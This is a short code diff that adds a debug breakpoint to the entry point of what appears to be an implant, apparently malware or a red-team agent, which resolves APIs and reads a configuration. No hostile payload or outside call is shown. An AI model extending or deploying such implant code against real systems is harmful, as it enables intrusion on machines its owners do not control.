@@ -302,6 +302,7 @@ namespace Implant {
 
 VOID Entrypoint(HMODULE Base) {
 
+    __debugbreak();
     NT_ASSERT(Memory::Context::ContextInit());
     NT_ASSERT(Implant::ResolveApi());
     NT_ASSERT(Implant::ReadConfig());
